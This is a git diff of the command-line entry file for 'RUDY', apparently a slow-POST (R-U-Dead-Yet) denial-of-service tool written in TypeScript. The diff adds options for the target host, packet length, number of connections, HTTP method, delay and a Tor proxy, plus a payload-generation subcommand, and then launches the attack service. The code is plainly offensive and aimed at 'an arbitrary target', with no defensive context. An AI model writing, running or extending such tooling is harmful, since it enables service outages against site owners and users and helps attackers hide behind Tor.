@@ -1,9 +1,9 @@
 //
 //  cli.ts
-//  Tribe-cms
+//  RUDY
 //
 //  Created by Sahil Chaddha on 07/05/2018.
-//  Copyright © 2018 Tribe-CMS.tv. All rights reserved.
+//  Copyright © 2018 RUDY. All rights reserved.
 //
 
 import * as program from "commander"
@@ -11,20 +11,33 @@ import Rudy from "./main"
 import ASCIIBanner from "./utils/ascii"
 import { TargetNotFound, IError } from "./models/error.model"
 import RudyService from "./service/rudy.service"
-import logger from "./utils/logger"
+import logger, { LogLevel } from "./utils/logger"
+import GeneratePayload from "./scripts/generatePayload"
 const logCategory: string = "RUDY_CLI"
-/* tslint:disable object-literal-sort-keys */
+/* tslint:disable object-literal-sort-keys max-line-length */
 
 // Parse Arguments
 program
-.version("1.0.0")
-.description("Sends slow RUDY Requests to target.")
-.option("-t, --target <string>", "Target URL to attack")
-.option("-c, --maxConnections <number>", "The number of connections to run simultaneously (Default: 50)")
-.option("-a, --userAgent <string>", "Provide a Static User Agent. (Default: Random)")
-.option("-d, --delay <number>", "Wait <seconds> before sending each byte. (Default: Random)")
-.option("-v, --verbose", "Enable Verbose Logs (Default: false)")
+    .version("1.0.0")
+    .description("Processes the RUDY attack on an arbitrary target.")
+    .option("-t, --target <string>", "Hostname of the target to focus")
+    .option("-l, --length <number>", "Length of the TCP Packet (Default : Large Number)")
+    .option("-n, --numberOfConnections <number>", "Amount of clients that are going to contact the server. (Default: 500)")
+    .option("-m, --method <string>", "HTTP Request Method. (Default: POST)")
+    .option("-p, --useTor", "Use Tor Proxy. (Default: false)")
+    .option("-d, --delay <number>", "Wait <seconds> before sending another TCP Packet. (Default: 2)")
+    .option("-v, --verbose", "Enable Verbose Logs (Default: false)")
+
+program
+.command("generatePayload <charCount>")
+.action((charCount, cmd) => {
+    const script = new GeneratePayload(charCount).run()
+})
+
+program
 .parse(process.argv)
+
+var rudyService = null
 
 // Shows ASCII banner
 ASCIIBanner.showInfo()
@@ -34,26 +47,27 @@ ASCIIBanner.showInfo()
         throw TargetNotFound
     }
 
+    if (program.verbose) {
+        logger.setLogLevel(LogLevel.VERBOSE)
+    }
+
     const config: Rudy.IRudyConfig = {
         target: program.target,
-        maxConnections: program.maxConnections,
-        userAgent: program.userAgent,
+        method: program.method,
+        packet_len: program.length,
+        maxConnections: program.numberOfConnections,
         delay: program.delay,
-        verbose: program.verbose,
+        shouldUseTor: program.useTor,
     }
     return config
 })
 .then((config: Rudy.IRudyConfig) => {
-    const rudyService = new RudyService(config)
-    return rudyService.attack()
-})
-.then(() => {
-    logger.info({message: "Attack Completed.", category: logCategory})
+    rudyService = new RudyService(config)
+    rudyService.attack()
 })
 .catch((error: IError) => {
     // Show Help on Error
     logger.error({message: error.message, category: error.category})
-    logger.info({message: "Stopping Attack", category: logCategory})
     program.help()
     process.exit()
 })
